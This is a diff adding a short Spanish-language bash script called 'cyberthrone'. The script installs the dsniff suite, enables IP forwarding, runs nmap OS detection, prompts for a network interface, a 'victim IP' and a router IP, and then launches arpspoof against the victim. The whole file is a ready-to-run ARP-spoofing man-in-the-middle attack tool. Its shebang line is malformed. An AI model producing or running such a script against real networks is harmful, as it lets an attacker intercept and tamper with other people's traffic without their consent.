@@ -1,0 +1,30 @@
+#bin!bash  
+zenity --info --text "bienvenido necesitamos de dsniff para poder continuar" --title="cyberthrone"
+       echo "buscando los paquetes necesarios.."
+   sleep 4s
+dsniff=/usr/sbin/dsniff
+if [ -e $dsniff ]; then							
+ echo "dsniff esta instalado"
+sleep 3s
+else 	
+	echo "instalando suite dsniff"
+		echo "" 
+			sudo apt-get install dsniff
+				echo "suite instalada ..."
+				sleep 1s
+				fi
+echo "Configurando el sistema para que reenvíe todos los paquetes a sus verdaderos destinatarios..."
+  echo 1 > /proc/sys/net/ipv4/ip_forward 
+   sleep 4s
+     echo "introduce tu ip"
+      read ip
+ sudo nmap -O $ip
+   echo "1ro tu interfaz de red (eth0 o wlan0): "			
+			read interfaz 
+			echo "ip victima"
+			read ipvictima
+			echo "ip de tu router"
+			read ip_router
+
+sudo arpspoof -i $interfaz -t $ipvictima $ip_router							
+					
